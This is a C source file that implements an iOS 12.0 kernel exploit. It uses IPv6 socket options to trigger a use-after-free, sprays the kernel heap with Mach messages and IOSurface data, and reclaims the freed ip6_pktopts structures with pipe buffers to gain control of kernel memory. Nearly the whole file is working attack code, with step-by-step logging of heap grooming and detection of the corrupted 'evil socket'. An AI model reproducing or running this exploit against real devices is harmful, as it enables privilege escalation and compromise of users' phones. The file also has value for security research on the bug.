//
//  exploit.c
//  se12.0exploit
//
//  Created by Justin Sherman on 1/13/20.
//  Copyright Â© 2020 Justin Sherman. All rights reserved.
//

#include <CoreFoundation/CoreFoundation.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/utsname.h>
#include <unistd.h>

#include "exploit.h"

#define CHECK_ERROR(err, errmsg, ...) \
    do { \
        if((err)){ \
            printf(errmsg, ##__VA_ARGS__); \
            return 1; \
        } \
    } while (0)

static const uint32_t MINMTU_MAGIC = 0xcafe;
static const uint32_t MINMTU_MAGIC_MASK = 0xffff0000;
static const uint32_t MINMTU_PIPEIDX_MASK = 0x0000ffff;

#define MAGIC_FROM_MINMTU(minmtu) (((minmtu) & MINMTU_MAGIC_MASK) >> 16)
#define PIPEIDX_FROM_MINMTU(minmtu) ((minmtu) & MINMTU_PIPEIDX_MASK)

static vm_size_t PAGESIZE = 0;

static const char *HOSTNAME = NULL;

static kern_return_t create_IOSurface_client(mach_port_t *client_out,
        uint32_t *surface_id_out){
    CFMutableDictionaryRef matching_dict = IOServiceMatching("IOSurfaceRoot");

    if(!matching_dict)
        return KERN_FAILURE;

    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
            matching_dict);

    if(service == IO_OBJECT_NULL)
        return KERN_FAILURE;

    io_connect_t client = IO_OBJECT_NULL;
    kern_return_t kret = IOServiceOpen(service, mach_task_self(), 0, &client);

    if(kret)
        return kret;

    uint32_t dict[] = {
        kOSSerializeBinarySignature,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,
        kOSSerializeString | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, /* "IOSurfaceAllocSize" */
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1000, 0x0,
    };

    /* iPhone 8,4 iOS 12.0 (16A366) */
    size_t surface_sz = strcmp(HOSTNAME, "blue") == 0 ? 0x3c8 : 0xdd0;
    char *surface = malloc(surface_sz);
    kret = IOConnectCallStructMethod(client, IOSURFACE_CREATE, dict, sizeof(dict),
            surface, &surface_sz);

    if(kret)
        return kret;

    *surface_id_out = *(uint32_t *)((uint8_t *)surface + 
            (strcmp(HOSTNAME, "blue") == 0 ? 0x10 : 0x18));

    free(surface);
    surface = NULL;

    *client_out = client;

    return KERN_SUCCESS;
}

static void create_spray_dict(mach_port_t client, uint32_t surface_id,
        struct ip6_pktopts *pktopts, uint32_t stringlen, uint32_t numstructs,
        size_t spray_dict_sz, char **spray_dict_out){
    const uint32_t OSString_len = stringlen;

    uint32_t *spray_dict = malloc(spray_dict_sz);
    const uint32_t *spray_dict_start = spray_dict;

    *(spray_dict)++ = surface_id;
    *(spray_dict)++ = 0;
    *(spray_dict)++ = kOSSerializeBinarySignature;
    *(spray_dict)++ = kOSSerializeArray | 1 | kOSSerializeEndCollection;
    *(spray_dict)++ = kOSSerializeDictionary | numstructs | kOSSerializeEndCollection;

    for(uint32_t i=0; i<numstructs; i++){
        *(spray_dict)++ = kOSSerializeSymbol | 4;
        /* key */
        *(spray_dict)++ = i;
        *spray_dict = kOSSerializeString | (OSString_len - 1);

        if(i+1 == numstructs)
            *spray_dict |= kOSSerializeEndCollection;

        spray_dict++;

        const uint8_t *current_OSString_end = (uint8_t *)spray_dict +
            (OSString_len - 1);

        if((uint8_t *)spray_dict + OSString_len == (current_OSString_end + 1)){
            memcpy(spray_dict, pktopts, stringlen);
            spray_dict += (stringlen / sizeof(uint32_t));
        }
        else{
            while((uint8_t *)spray_dict + stringlen < current_OSString_end){
                memcpy(spray_dict, pktopts, stringlen);
                spray_dict += (stringlen / sizeof(uint32_t));
            }

            while(spray_dict < current_OSString_end)
                *(spray_dict)++ = 0x41414141;
        }
    }

    *spray_dict_out = spray_dict_start;
}

static void my_mach_zone_force_gc(int kalloc_zone, int free_msgs){
    mach_port_t recv_port;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &recv_port);

    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    mach_msg_type_number_t cnt = MACH_PORT_LIMITS_INFO_COUNT;
    mach_port_set_attributes(mach_task_self(), recv_port, MACH_PORT_LIMITS_INFO,
            (mach_port_info_t)&limits, cnt);

    struct ool_msg {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_ool_ports_descriptor_t ool_port_desc;
    };

    /* int kalloc_zone = 32768; */

    /* in the kernel, each port will be an 8 byte pointer, purpose of this
     * is to make the largest allocation we can for a given zone
     */
    int port_count = kalloc_zone / 8;
    /* calloc for MACH_PORT_NULL */
    mach_port_t *ports = calloc(port_count, sizeof(mach_port_t));

    struct ool_msg *oolmsg = malloc(sizeof(struct ool_msg));
    oolmsg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) |
        MACH_MSGH_BITS_COMPLEX;
    oolmsg->hdr.msgh_size = sizeof(struct ool_msg);
    oolmsg->hdr.msgh_remote_port = recv_port;
    oolmsg->hdr.msgh_local_port = MACH_PORT_NULL;
    oolmsg->hdr.msgh_id = 0xaabbccdd;
    oolmsg->body.msgh_descriptor_count = 1;

    mach_msg_ool_ports_descriptor_t *opd = &oolmsg->ool_port_desc;

    opd->address = ports;
    opd->count = port_count;
    opd->deallocate = 0;
    opd->copy = MACH_MSG_PHYSICAL_COPY;
    opd->disposition = MACH_MSG_TYPE_MAKE_SEND;
    opd->type = MACH_MSG_OOL_PORTS_DESCRIPTOR;

    /* shoving 16mb into kalloc.32768 works really well */
    int msgcount = 1023;

    for(int i=0; i<msgcount; i++){
        mach_msg(&oolmsg->hdr, MACH_SEND_MSG, sizeof(*oolmsg), 0,
                MACH_PORT_NULL, 0, MACH_PORT_NULL);
    }

    free(oolmsg);
    free(ports);

    if(free_msgs)
        mach_port_destroy(mach_task_self(), recv_port);
}

static mach_port_t kalloc(int len){
    mach_port_t recv_port;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &recv_port);

    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    mach_msg_type_number_t cnt = MACH_PORT_LIMITS_INFO_COUNT;
    mach_port_set_attributes(mach_task_self(), recv_port, MACH_PORT_LIMITS_INFO,
            (mach_port_info_t)&limits, cnt);

    struct ool_msg {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_ool_ports_descriptor_t ool_port_desc;
    };

    int port_count = len / 8;
    /* calloc for MACH_PORT_NULL */
    mach_port_t *ports = calloc(port_count, sizeof(mach_port_t));

    struct ool_msg *oolmsg = malloc(sizeof(struct ool_msg));
    oolmsg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) |
        MACH_MSGH_BITS_COMPLEX;
    oolmsg->hdr.msgh_size = sizeof(struct ool_msg);
    oolmsg->hdr.msgh_remote_port = recv_port;
    oolmsg->hdr.msgh_local_port = MACH_PORT_NULL;
    oolmsg->hdr.msgh_id = 0xaabbccdd;
    oolmsg->body.msgh_descriptor_count = 1;

    mach_msg_ool_ports_descriptor_t *opd = &oolmsg->ool_port_desc;

    opd->address = ports;
    opd->count = port_count;
    opd->deallocate = 0;
    opd->copy = MACH_MSG_PHYSICAL_COPY;
    opd->disposition = MACH_MSG_TYPE_MAKE_SEND;
    opd->type = MACH_MSG_OOL_PORTS_DESCRIPTOR;

    kern_return_t kret = mach_msg(&oolmsg->hdr, MACH_SEND_MSG, sizeof(*oolmsg), 0,
            MACH_PORT_NULL, 0, MACH_PORT_NULL);
    if(kret){
        printf("%s: mach_msg kret %s\n", __func__, mach_error_string(kret));
    }

    free(oolmsg);
    free(ports);

    return recv_port;
}

static int create_vulnerable_socket(void){
    int s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);

    if(s == -1){
        printf("error creating socket: %s\n", strerror(errno));
        return -1;
    }

    struct so_np_extensions ex = {
        .npx_flags = SONPX_SETOPTSHUT,
        .npx_mask = SONPX_SETOPTSHUT
    };
    
    int err = setsockopt(s, SOL_SOCKET, SO_NP_EXTENSIONS, &ex, sizeof(ex));

    if(err == -1){
        printf("first setsockopt: %s\n", strerror(errno));
        return -1;
    }

    int minmtu = IP6PO_MINMTU_ALL;
    err = setsockopt(s, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &minmtu, sizeof(minmtu));

    if(err == -1){
        printf("second setsockopt: %s\n", strerror(errno));
        return -1;
    }

    return s;
}

static int get_minmtu(int socket, int *minmtu){
    socklen_t minmtu_sz = sizeof(*minmtu);
    return getsockopt(socket, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, &minmtu_sz);
}

static int increase_file_limit(void){
    struct rlimit rl = {0};

    int err = getrlimit(RLIMIT_NOFILE, &rl);

    if(err){
        printf("%s: getrlimit: %s\n", __func__, strerror(errno));
        return err;
    }

    rl.rlim_cur = OPEN_MAX;
    rl.rlim_max = rl.rlim_cur;

    err = setrlimit(RLIMIT_NOFILE, &rl);

    if(err){
        printf("%s: setrlimit: %s\n", __func__, strerror(errno));
        return err;
    }

    return 0;
}

extern kern_return_t mach_zone_force_gc(host_t host);

void DumpHex(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

int exploit(mach_port_t *tfp0out){
    increase_file_limit();
    printf("sizeof(struct ip6_pktopts) = %#x\n", sizeof(struct ip6_pktopts));
    struct utsname u = {0};
    uname(&u);

    printf("%s %s %s %s %s\n", u.sysname, u.nodename, u.release, u.version,
            u.machine);

    HOSTNAME = u.nodename;

    kern_return_t kret;
    mach_port_t client = MACH_PORT_NULL;
    uint32_t surface_id = 0;

    if((kret = create_IOSurface_client(&client, &surface_id)) != KERN_SUCCESS){
        printf("Couldn't create a new IOSurface: %s\n", mach_error_string(kret));
        return 1;
    }

    /* printf("Got usable surface ID %d\n", surface_id); */

    _host_page_size(mach_host_self(), &PAGESIZE);

    /* struct ip6_pktopts *fake_pktopts = calloc(1, sizeof(struct ip6_pktopts)); */
    /* fake_pktopts->ip6po_minmtu = MINMTU_MAGIC; */

    int num_pipes = 3000;
    int *pipes[num_pipes];

    for(int i=0; i<num_pipes; i++)
        pipes[i] = malloc(sizeof(int) * 2);

    uint32_t kalloc_512_string_len = 512;
    uint32_t kalloc_512_spray_num_structs = 100000;
    size_t kalloc_512_spray_dict_sz = (5 * sizeof(uint32_t)) +
        (kalloc_512_spray_num_structs * 
         ((3 * sizeof(uint32_t)) + kalloc_512_string_len));

    struct ip6_pktopts pktopts = {0};

    char *kalloc_512_spray_dict = NULL;
    create_spray_dict(client, surface_id, &pktopts, kalloc_512_string_len,
            kalloc_512_spray_num_structs, kalloc_512_spray_dict_sz,
            &kalloc_512_spray_dict);

    printf("Made kalloc.512 spray dict\n");
    printf("Making controlled allocations in kalloc.192...\n");

    int num_of_each = 4000;//7400;
    int sockets[num_of_each];
    mach_port_t ports[num_of_each];

    for(int i=0; i<num_of_each; i++){
        /* this will initialize inp_depend6.inp6_outputopts for this socket */
        /* kalloc.192 allocation */
        int s = create_vulnerable_socket();

        if(s == -1){
            printf("Could not create socket %d\n", i);
            return 1;
        }

        sockets[i] = s;
        ports[i] = kalloc(192);
    }

    printf("Freeing them...\n");

    for(int i=0; i<num_of_each; i++){
        disconnectx(sockets[i], 0, 0);
        mach_port_destroy(mach_task_self(), ports[i]);
    }

    printf("About to try and reallocate on top of one of the dangling pointers\n");

    mach_zone_force_gc(mach_host_self());
    sleep(2);

    struct ip6_pktopts pipe_spray_opts = {0};
    /* pipe_spray_opts.ip6po_pktinfo = 0xfffffff017004000; */

    /* create a bunch of kalloc.512 pipe buffers, if all went well,
     * several of our pipe buffers should overlap with the dangling
     * ip6_pktopts structs
     */
    for(int i=0; i<num_pipes; i++){
        if(pipe(pipes[i])){
            printf("create pipe %d: %s\n", i, strerror(errno));
            return 1;
        }

        pipe_spray_opts.ip6po_minmtu = (MINMTU_MAGIC << 16) | i;
        
        ssize_t w = write(*(pipes[i] + 1), &pipe_spray_opts, sizeof(pipe_spray_opts));

        if(w == -1){
            printf("write to pipe %d: %s\n", i, strerror(errno));
            return 1;
        }
    }

    int evil_socket = -1;
    int *evil_pipe = NULL;

    int FIND_EVIL_SOCKET_DEBUG = 1;

    for(int i=0; i<num_of_each; i++){
        uint32_t minmtu = 0;
        if(get_minmtu(sockets[i], &minmtu))
            continue;

        uint32_t minmtu_magic = MAGIC_FROM_MINMTU(minmtu);

        if(minmtu_magic == MINMTU_MAGIC){
            evil_socket = sockets[i];
            
            uint32_t possible_evil_pipe = PIPEIDX_FROM_MINMTU(minmtu);

            if(possible_evil_pipe > num_pipes){
                printf("pipe idx (%d) > num_pipes (%d)????\n",
                        possible_evil_pipe, num_pipes);
                return 1;
            }

            evil_pipe = pipes[possible_evil_pipe];
            break;
        }
        else{
            if(FIND_EVIL_SOCKET_DEBUG){
                printf("socket %d minmtu %#x minmtu_magic %#x\n", i, minmtu,
                        minmtu_magic);
            }
        }
    }

    if(evil_socket == -1){
        printf("Couldn't reallocate a controlled ip6_pktopts struct in kalloc.512\n");
        return 1;
    }

    int minmtu = 0;
    if(get_minmtu(evil_socket, &minmtu)){
        printf("Couldn't read minmtu from evil_socket? %s\n", strerror(errno));
        return 1;
    }

    printf("Got a controlled ip6_pktopts struct in kalloc.512, minmtu: %#x\n", minmtu);
    printf("Evil socket: %d\n", evil_socket);

    /* struct in6_pktinfo *info = calloc(1, sizeof(struct in6_pktinfo)); */
    /* socklen_t infosz = sizeof(*info); */

    struct in6_pktinfo info = {0};
    socklen_t infosz = sizeof(info);

    int err = getsockopt(evil_socket, IPPROTO_IPV6, IPV6_PKTINFO, &info, &infosz);

    if(err == -1){
        printf("getsockopt with IPV6_PKTINFO: %s\n", strerror(errno));
        return 1;
    }

    printf("getsockopt with IPV6_PKTINFO passed\n");
    DumpHex(&info, sizeof(info));

    for(int i=0; i<num_pipes; i++){
        if(pipes[i] != evil_pipe){
            close(*pipes[i]);
            close(*(pipes[i] + 1));
            free(pipes[i]);
        }
    }

    for(int i=0; i<num_of_each; i++){
        if(sockets[i] != evil_socket)
            close(sockets[i]);
    }

    return 0;
}
